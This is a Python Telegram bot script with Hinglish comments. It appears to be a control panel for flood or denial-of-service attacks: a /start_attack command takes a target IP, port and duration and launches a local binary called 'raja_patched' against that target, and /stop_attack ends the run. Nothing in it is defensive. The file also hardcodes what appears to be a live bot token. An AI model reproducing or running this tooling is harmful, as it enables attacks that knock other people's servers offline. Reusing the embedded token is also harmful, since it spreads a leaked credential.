import subprocess
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ✅ Apna Telegram Bot Token yahan daal
BOT_TOKEN = "7992226765:AAGjm1bRrt_lgpA6JlNBJmxLNofu8CYXX8E"

# ✅ Teri binary ka path
BINARY_PATH = "./raja_patched"

# ✅ Process store karne ke liye variable
running_process = None

# ✅ Attack start karne ka function
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running_process

    if len(context.args) < 3:
        await update.message.reply_text("❌ Usage: /start_attack <IP> <PORT> <TIME_IN_MIN>")
        return

    target_ip = context.args[0]
    target_port = context.args[1]
    
    try:
        duration = int(context.args[2]) * 60
        await update.message.reply_text(f"🔥 Attack started on {target_ip}:{target_port} for {context.args[2]} minutes!")

        # ✅ Binary execute karna (IP + PORT ke saath)
        running_process = subprocess.Popen([BINARY_PATH, target_ip, target_port])

        # ✅ Diye gaye time tak wait karna, phir stop karna
        await asyncio.sleep(duration)
        if running_process:
            running_process.terminate()
            await update.message.reply_text(f"✅ Attack on {target_ip}:{target_port} stopped automatically!")
            running_process = None
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Example: /start_attack 192.168.1.1 80 5")

# ✅ Attack stop karne ka function
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running_process
    if running_process:
        running_process.terminate()
        await update.message.reply_text("⛔ Attack stopped manually!")
        running_process = None
    else:
        await update.message.reply_text("❌ No attack is running!")

# ✅ Bot setup karna
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start_attack", start_attack))
    app.add_handler(CommandHandler("stop_attack", stop_attack))

    app.run_polling()

if __name__ == "__main__":
    main()
